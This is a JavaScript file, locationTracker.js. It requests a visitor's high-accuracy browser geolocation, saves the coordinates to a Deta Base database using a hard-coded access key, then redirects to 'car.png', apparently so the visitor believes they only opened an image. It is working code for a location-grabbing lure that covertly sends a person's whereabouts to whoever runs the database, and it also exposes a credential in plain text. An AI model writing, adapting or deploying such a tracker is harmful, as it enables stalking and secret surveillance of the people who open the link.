// locationTracker.js

import { Deta } from 'deta';

const deta = Deta();
const db = deta.Base("Location", "d0wnfstadsw_5RpqNBcY9k8wnBBfouQUXteXM6JRX546");

// Function to get the visitor's location
export function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

// Function to handle errors in geolocation
function errorHandler(error) {
    console.log("Error getting location:", error.message);
}

// Function to save the visitor's location in Deta Space database and redirect
function savePosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    console.log("Latitude: " + latitude + " Longitude: " + longitude);

    // Store the location data in your Deta Space database
    db.put({ latitude: latitude, longitude: longitude }, "visitor_location")
        .then(response => {
            console.log('Location data saved successfully:', response);
            // Redirect to "car.png"
            window.location.replace("car.png");
        })
        .catch(error => {
            console.error('Error saving location data:', error);
        });
}
